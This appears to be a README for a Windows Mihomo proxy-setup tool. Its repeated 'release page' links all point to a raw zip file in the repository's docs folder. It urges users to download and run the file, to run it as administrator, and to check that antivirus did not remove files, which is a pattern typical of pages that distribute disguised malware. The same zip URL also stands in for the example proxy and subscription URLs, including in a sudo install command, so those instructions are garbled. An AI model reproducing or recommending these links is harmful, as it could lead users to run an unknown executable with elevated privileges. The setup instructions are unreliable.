# 🧭 mihomo-upstream-proxy-setup - Route traffic through a local proxy

[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip)

## 📥 Download

Visit the [release page](https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip) to download and run the Windows file.

## 🪟 What this app does

This app helps route your network traffic through a local Mihomo proxy first, then through an internal HTTP proxy, and then out to the internet.

Traffic path:

`app -> local mihomo -> internal proxy -> subscription nodes -> internet`

It is useful when you need a local proxy setup that uses a company or private upstream proxy to reach subscription nodes.

## ✅ What you need

Before you start, make sure you have:

- A Windows PC
- Permission to run downloaded apps
- Access to your internal HTTP proxy
- A Mihomo subscription URL
- A stable internet connection

For best results, keep these details ready:

- Internal proxy URL
- Internal proxy server name
- Internal proxy port
- Subscription URL

## 🚀 Getting started on Windows

Follow these steps in order.

### 1. Open the release page

Use this link:

[Go to the release page](https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip)

### 2. Download the Windows file

On the release page:

- Find the latest release
- Look for a Windows file such as `.exe` or `.zip`
- Download the file to your computer

If you see a zip file, save it first and then extract it.

### 3. Run the app

If you downloaded an `.exe` file:

- Double-click the file
- If Windows asks for permission, choose Run
- If the file opens from a zip, move it to a folder first, then run it

### 4. Enter your proxy details

When the app starts, enter the required values:

- Internal proxy URL
- Internal proxy server
- Internal proxy port
- Mihomo subscription URL

Use the exact values from your network setup. Small changes can break the connection.

### 5. Start the setup

After you enter the details:

- Confirm the settings
- Start the setup process
- Wait for the app to finish applying the configuration

## 🧩 What gets set up

The app prepares a local Mihomo setup with a few parts:

- Mihomo runs on your machine
- The app uses your internal HTTP proxy as the upstream route
- Subscription nodes load through that proxy
- Local traffic can then use the Mihomo connection

This keeps the setup simple and repeatable.

## 🔧 Main parts of the setup

You do not need to manage these by hand, but it helps to know what they do:

- **Local Mihomo**: handles local proxy traffic
- **Internal proxy**: sends traffic to the next network hop
- **Subscription nodes**: provide the remote routes
- **Config file**: stores the proxy details and subscription link

## 📁 Files the app uses

The app may create or use these files during setup:

- `config.yaml` for the proxy setup
- `env.sh` for saved values
- service files for auto start
- shell helper files for local use

On Windows, these may appear in the app folder or a user data folder, based on the build.

## 🛠️ If the app does not start

Try these steps:

- Run the file as administrator
- Check that the download finished fully
- Make sure Windows did not block the file
- Confirm your proxy URL is correct
- Confirm your subscription URL works in a browser
- Make sure the port number is valid

If the app still fails:

- Download the file again from the release page
- Try a fresh folder with no special characters in the path
- Check that your antivirus did not remove any files

## 🌐 Proxy details you may need

Use these values from your network setup:

- **Internal Proxy URL**: full proxy address such as `https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip`
- **Internal Proxy Server**: host name or IP address
- **Internal Proxy Port**: port number used by the proxy
- **Subscription URL**: your Mihomo subscription link

Keep the URL format exact. Include `http://` if your proxy uses HTTP.

## 🧪 Basic checks after setup

After the app finishes, check the following:

- The app opens without errors
- Your proxy details are saved
- The subscription loads
- Local traffic uses the Mihomo route
- Websites that depend on the proxy can connect

If a site does not load, check the proxy address first.

## 🧹 Remove or reset the setup

If you need to start over:

- Close the app
- Delete the saved config files
- Remove the app folder if needed
- Download a fresh copy from the release page
- Run the setup again with the correct values

## 📌 Release download

Use the release page to download and run the Windows build:

[https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip](https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip)

## 🖥️ For users who also run Linux

This project also supports a simple Linux install path for systems with `root`, `systemd`, `curl`, and `python3`.

Typical setup flow:

- install Mihomo
- install helper scripts
- write `~/.config/mihomo/env.sh`
- generate `config.yaml`
- install and enable `mihomo.service`
- connect shell startup files

A typical Linux command looks like this:

```bash
sudo INTERNAL_PROXY_URL='https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip' \
  INTERNAL_PROXY_SERVER='proxy.example.internal' \
  INTERNAL_PROXY_PORT='3128' \
  MIHOMO_SUBSCRIPTION_URL='https://raw.githubusercontent.com/xiphiidaeequinox80/mihomo-upstream-proxy-setup/main/docs/mihomo_proxy_upstream_setup_pukeko.zip' \
  ./scripts/install.sh
```

## 🧭 How the connection works

Your traffic moves in this order:

1. Your app or browser sends traffic to the local Mihomo proxy
2. Mihomo sends the request to the internal HTTP proxy
3. The internal proxy reaches the subscription nodes
4. The nodes pass the traffic to the internet

This setup is useful when direct access is not allowed.

## 🔒 Common setup mistakes

Watch for these common issues:

- Wrong proxy port
- Missing `http://` in the proxy URL
- Broken subscription link
- Downloaded file not fully extracted
- Running the app from a locked folder
- Using an old release file

## 📎 Helpful release page tips

When you open the release page:

- Look for the newest version
- Read the file name before downloading
- Choose the Windows build
- Save the file in a simple folder like `Downloads`
- Run the file after the download ends

## 🧰 Need to change settings later

If your proxy or subscription link changes:

- Open the app again
- Update the values
- Save the changes
- Restart the setup if needed

The app should keep the same traffic path while using your new values